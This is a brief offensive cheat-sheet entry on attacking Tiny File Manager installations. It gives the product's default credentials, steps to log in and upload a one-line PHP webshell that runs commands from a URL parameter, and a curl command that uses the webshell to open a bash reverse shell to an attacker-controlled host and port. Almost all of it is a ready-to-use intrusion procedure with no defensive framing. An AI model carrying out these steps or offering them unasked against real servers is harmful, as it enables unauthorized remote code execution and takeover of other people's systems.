# Tiny File Manager — Default Credentials + Webshell Upload

Tiny File Manager is a single-PHP-file manager often deployed for convenience. Default credentials are rarely changed.

```
admin:admin@123
user:12345
```

## Steps

1. Navigate to the file manager (often `/files/`, `/manager/`, `/filemanager/`)
2. Login with default creds
3. Upload a PHP webshell to the web root:
   - Click **Upload** → choose `shell.php` containing `<?php system($_GET['cmd']); ?>`
4. Access via: `http://<TARGET>/shell.php?cmd=id`
5. Upgrade to reverse shell:
   ```bash
   curl "http://<TARGET>/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/<LHOST>/<LPORT>+0>%261'"
   ```
